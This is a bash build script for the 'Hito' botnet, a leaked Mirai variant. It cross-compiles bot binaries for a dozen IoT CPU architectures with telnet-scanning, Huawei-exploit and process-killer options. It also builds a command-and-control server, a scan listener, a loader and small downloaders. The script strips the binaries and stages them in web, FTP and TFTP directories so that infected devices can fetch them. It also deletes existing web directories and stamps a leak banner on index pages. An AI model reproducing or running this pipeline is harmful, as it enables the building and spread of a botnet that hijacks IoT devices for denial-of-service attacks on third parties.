#!/bin/bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

export PATH=$PATH:/etc/xcompile/aarch64be/bin
export PATH=$PATH:/etc/xcompile/aarch64/bin
# export PATH=$PATH:/etc/xcompile/arcle-750d/bin
# export PATH=$PATH:/etc/xcompile/arcle-hs38/bin
export PATH=$PATH:/etc/xcompile/bfin/bin
export PATH=$PATH:/etc/xcompile/m68k-68xxx/bin
export PATH=$PATH:/etc/xcompile/m68k-coldfire/bin
export PATH=$PATH:/etc/xcompile/microblazebe/bin
export PATH=$PATH:/etc/xcompile/microblazeel/bin
export PATH=$PATH:/etc/xcompile/nios2/bin
export PATH=$PATH:/etc/xcompile/openrisc/bin
export PATH=$PATH:/etc/xcompile/riscv64/bin
export PATH=$PATH:/etc/xcompile/sh-sh4aeb/bin
export PATH=$PATH:/etc/xcompile/sh-sh4/bin
export PATH=$PATH:/etc/xcompile/x86-64-core-i7/bin
export PATH=$PATH:/etc/xcompile/x86-core2/bin
export PATH=$PATH:/etc/xcompile/x86-i686/bin
export PATH=$PATH:/etc/xcompile/xtensa-lx60/bin
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/alpha/bin
export PATH=$PATH:/etc/xcompile/mips64/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function arc_compile {
    "$1-linux-gcc" -DMIRAI_b_ARCH="$3" bot/*.c -s -o r/"$2"
}
function exploit_bot {
    "$1-linux-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyx86_bot {
    "$1-gcc" -std=c99 $3 botH/x86/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeymips_bot {
    "$1-gcc" -std=c99 $3 botH/mips/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeympsl_bot {
    "$1-gcc" -std=c99 $3 botH/mpsl/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyspc_bot {
    "$1-gcc" -std=c99 $3 botH/spc/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyppc_bot {
    "$1-gcc" -std=c99 $3 botH/ppc/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeym68k_bot {
    "$1-gcc" -std=c99 $3 botH/m68k/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeysh4_bot {
    "$1-gcc" -std=c99 $3 botH/sh4/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
# arm hehe leaked by Mezy#1337 boi
function honeyarm_bot {
    "$1-gcc" -std=c99 $3 botH/arm/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyarm5_bot {
    "$1-gcc" -std=c99 $3 botH/arm5/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyarm6_bot {
    "$1-gcc" -std=c99 $3 botH/arm6/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyarm7_bot {
    "$1-gcc" -std=c99 $3 botH/arm7/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}




rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/wrgjwrgjwrg246356356356
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o loader/scanListen scanListen.go

compile_bot i586 n1 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot mips n2 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot mipsel n3 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot armv4l n4 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot armv5l n5 "-w -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot armv6l n6 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot armv7l n7 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot powerpc n8 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot sparc n9 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot sh4 n10 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
arc_compile arc n11 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
compile_bot m68k n12 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"

#exploit_bot mips64 hmips64 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"
#exploit_bot riscv64 hriscv64 "-static -DKILLER -DMIRAI_TELNET -DHUAWEI -w"

# honeypot bin compile
honeyarm_bot armv4l harm "-static"
honeyarm5_bot armv5l harm5 "-static"
honeyarm6_bot armv6l harm6 "-static"
honeyarm7_bot armv7l harm7 "-static"

honeymips_bot mips hmips "-static"
honeympsl_bot mipsel hmpsl "-static"
honeyspc_bot sparc hspc "-static"
honeyppc_bot powerpc hppc "-static"
honeym68k_bot m68k hm68k "-static"
honeysh4_bot sh4 hsh4 "-static"
honeyx86_bot i586 hx86 "-static"



# /etc/xcompile/aarch64/bin/aarch64-linux-gcc bot/*.c -o release/haarch64 -Daarch64 -w
# /etc/xcompile/aarch64be/bin/aarch64_be-linux-gcc bot/*.c -o release/haarch64be -Daarch64be -w
# /etc/xcompile/bfin/bin/bfin-linux-gcc bot/*.c -o release/hbfin -Dbfin -w
# /etc/xcompile/nios2/bin/nios2-linux-gcc bot/*.c -o release/hnios2 -Dnios2 -w
# /etc/xcompile/openrisc/bin/or1k-linux-gcc bot/*.c -o release/hopenrisc -Dopenrisc -w
# /etc/xcompile/riscv64/bin/riscv64-linux-gcc bot/*.c -o release/hriscv64 -Driscv64 -w
# /etc/xcompile/sh-sh4/bin/sh4-linux-gcc bot/*.c -o release/hsh-sh4 -Dsh-sh4 -w
# /etc/xcompile/x86-64-core-i7/bin/x86_64-linux-gcc bot/*.c -o release/hx86-64-core-i7 -Dx86-64-core-i7 -w
# /etc/xcompile/x86-core2/bin/i686-linux-gcc bot/*.c -o release/hx86-core2 -Dx86-core2 -w
# /etc/xcompile/x86-i686/bin/i686-linux-gcc bot/*.c -o release/hx86-i686 -Dx86-i686 -w
# /etc/xcompile/xtensa-lx60/bin/xtensa-linux-gcc bot/*.c -o release/hxtensa -Dxtensa-lx60 -w
# /etc/xcompile/alpha/bin/alpha-linux-gcc bot/*.c -o release/halpha -DALPHA -w
# 
# /etc/xcompile/mips64/bin/mips64-linux-gcc bot/*.c -o release/hmips64 -DMIPS64 -w
# 
# 
# /etc/xcompile/arcle-750d/bin/arc-linux-gcc bot/*.c -o release/harcle-750d -Darcle-750d -w
# /etc/xcompile/arcle-hs38/bin/arc-linux-gcc bot/*.c -o release/harcle-hs38 -Darcle-hs38 -w
# /etc/xcompile/microblazebe/bin/microblaze-linux-gcc bot/*.c -o release/hmicroblazebe -Dmicroblazebe -w
# /etc/xcompile/microblazeel/bin/microblazeel-linux-gcc bot/*.c -o release/hmicroblazeel -Dmicroblazeel -w
# /etc/xcompile/m68k-68xxx/bin/m68k-linux-gcc bot/*.c -o release/hm68k-68xxx -Dm68k-68xxx -w
# /etc/xcompile/m68k-coldfire/bin/m68k-linux-gcc bot/*.c -o release/hm68k-coldfire -Dm68k-coldfire -w
# 
# 
# /etc/xcompile/i586/bin/i586-gcc /root/bot/*.c -o /root/release/d -Dx86 -w -static -DKILLER -DMIRAI_TELNET -DHUAWEI -DDEBUG

echo "[hito] stripping normal bins..."
i586-strip -s release/n1
mips-strip -s release/n2
mipsel-strip -s release/n3
powerpc-strip -s release/n8
sparc-strip -s release/n9
armv4l-strip -s release/n4
armv5l-strip -s release/n5
armv6l-strip -s release/n6
armv7l-strip -s release/n7
sh4-strip -s release/n10
m68k-strip -s release/n12

# echo "[hito] stripping epic bins..."
# aarch64-linux-strip -S release/haarch64
# aarch64_be-linux-strip -S release/haarch64be
# bfin-linux-strip -S release/hbfin
# microblazeel-linux-strip -S release/hmicroblazeel
# microblazebe-linux-strip -S release/hmicroblazebe
# nios2-linux-strip -S release/hnios2
# or1k-linux-strip -S release/hor1k
# riscv64-linux-strip -S release/hriscv64
# sh4-linux-strip -S release/hsh4-sh4
# x86_64-linux-strip -S release/hx8x86-64-core-i7
# i686-linux-strip -S release/hx86-i68
# xtensa-linux-strip -S release/hxtensa

echo "[hito] stripping finished"

mv release/d /root/

# The normal boring bins
cp release/hmips /var/www/html/wrgjwrgjwrg246356356356
cp release/hx86 /var/www/html/wrgjwrgjwrg246356356356
cp release/hmpsl /var/www/html/wrgjwrgjwrg246356356356
cp release/hsh4 /var/www/html/wrgjwrgjwrg246356356356
cp release/hppc /var/www/html/wrgjwrgjwrg246356356356
cp release/hspc /var/www/html/wrgjwrgjwrg246356356356
cp release/hm68k /var/www/html/wrgjwrgjwrg246356356356
cp release/harm /var/www/html/wrgjwrgjwrg246356356356
cp release/harm5 /var/www/html/wrgjwrgjwrg246356356356
cp release/harm6 /var/www/html/wrgjwrgjwrg246356356356
cp release/harm7 /var/www/html/wrgjwrgjwrg246356356356

cp release/n* /var/www/html/wrgjwrgjwrg246356356356


# The cool bins
# cp release/haarch64 /var/www/html
# cp release/haarch64be /var/www/html
# cp release/harcle-750d /var/www/html
# cp release/harcle-hs38 /var/www/html
# cp release/hm68k-68xxx /var/www/html
# cp release/hmicroblazebe /var/www/html
# cp release/hmicroblazeel /var/www/html
# cp release/hnios2 /var/www/html
# cp release/hopenrisc /var/www/html
# cp release/hsh-sh4 /var/www/html
# cp release/hx86-64-core-i7 /var/www/html
# cp release/hx86-core2 /var/www/html
# cp release/hx86-i686 /var/www/html
# cp release/hxtensa /var/www/html
# cp release/harc /var/www/html
# cp release/halpha /var/www/html
# cp release/hmips64 /var/www/html


# The c00l bins 
# cp release/haarch64 /var/www/html/wrgjwrgjwrg246356356356
# cp release/haarch64be /var/www/html/wrgjwrgjwrg246356356356
# cp release/harcle-750d /var/www/html/wrgjwrgjwrg246356356356
# cp release/harcle-hs38 /var/www/html/wrgjwrgjwrg246356356356
# cp release/hm68k-68xxx /var/www/html/wrgjwrgjwrg246356356356
# cp release/hmicroblazebe /var/www/html/wrgjwrgjwrg246356356356
# cp release/hmicroblazeel /var/www/html/wrgjwrgjwrg246356356356
# cp release/hnios2 /var/www/html/wrgjwrgjwrg246356356356
# cp release/hopenrisc /var/www/html/wrgjwrgjwrg246356356356
# cp release/hsh-sh4 /var/www/html/wrgjwrgjwrg246356356356
# cp release/hx86-64-core-i7 /var/www/html/wrgjwrgjwrg246356356356
# cp release/hx86-core2 /var/www/html/wrgjwrgjwrg246356356356
# cp release/hx86-i686 /var/www/html/wrgjwrgjwrg246356356356
# cp release/hxtensa /var/www/html/wrgjwrgjwrg246356356356
# cp release/harc /var/www/html/wrgjwrgjwrg246356356356
# cp release/halpha /var/www/html/wrgjwrgjwrg246356356356
# cp release/hmips64 /var/www/html/wrgjwrgjwrg246356356356


echo "[hito] making root bin"

compile_bot i586 rootOwO "-static -DHUAWEI -w"


echo "[hito] moving bins to directory"
cp release/h* /var/ftp
cp release/n* /var/ftp
cp release/rootOwO /var/www/html/wrgjwrgjwrg246356356356

mv release/h* /var/lib/tftpboot
mv release/n* /var/lib/tftpboot
gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader


echo "<center>*************************<br>Hito leaked by Mezy#1337 @m3zyxd on instagram<br>*************************</center>" >> /var/www/html/index.html
echo "<center>*************************<br>Hito leaked by Mezy#1337 @m3zyxd on instagram<br>*************************</center>" >> /var/www/html/wrgjwrgjwrg246356356356/index.html

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.spc

# arc-linux-gcc -Os -D BOT_ARCH=\"arc\" -D ARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arc
# alpha-linux-gcc -Os -D BOT_ARCH=\"alpha\" -D ALPHA -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.alpha
# mips64-linux-gcc -Os -D BOT_ARCH=\"mips64\" -D ALPHA -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips64
# aarch64-linux-gcc -Os -D BOT_ARCH=\"aarch64\" -D aarch64 -Wl,--gc-sections -fdata-sections -ffunction-sections -e  -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.aarch64
# aarch64_be-linux-gcc -Os -D BOT_ARCH=\"aarch64be\" -D aarch64be -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.aarch64be
# # arc-linux-gcc -Os -D BOT_ARCH=\"arcle-750d\" -D arcle-hs38 -Wl,--gc-sections -fdata-sections -ffunction-sections -e  -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arcle-750d
# bfin-linux-gcc -Os -D BOT_ARCH=\"bfin\" -D bfin -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.bfin
# m68k-linux-gcc -Os -D BOT_ARCH=\"hm68k-68xxx\" -D m68k-68xxx -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68klinux
# m68k-linux-gcc -Os -D BOT_ARCH=\"hm68k-coldfire\" -D m68k-coldfire -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.hm68k-coldfire
# microblazeel-linux-gcc -Os -D BOT_ARCH=\"microblazebe\" -D microblazebe -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.microblazebe
# microblazebe-linux-gcc -Os -D BOT_ARCH=\"microblazeel\" -D microblazeel -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.microblazeel
# nios2-linux-gcc -Os -D BOT_ARCH=\"nios2\" -D nios2 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.nios2
# or1k-linux-gcc -Os -D BOT_ARCH=\"or1k\" -D openrisc -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.or1k
# riscv64-linux-gcc -Os -D BOT_ARCH=\"riscv64\" -D riscv64 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.riscv64
# sh4-linux-gcc -Os -D BOT_ARCH=\"hsh-sh4\" -D sh-sh4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.hsh-sh4
# x86_64-linux-gcc -Os -D BOT_ARCH=\"x86_64\" -D x86-core2 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86_64
# i686-linux-gcc -Os -D BOT_ARCH=\"i686\" -D x86-i686 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.i686
# xtensa-linux-gcc -Os -D BOT_ARCH=\"xtensa\" -D xtensa-lx60 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.xtensa


armv4l-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
m68k-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mips-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc

# aarch64-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.aarch64
# aarch64_be-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.aarch64be
# # arc-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arcle-750d
# bfin-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.bfin
# m68k-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68klinux
# m68k-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.hm68k-coldfire
# microblaze-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.hm68k-coldfire
# microblazeel-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.microblazebe
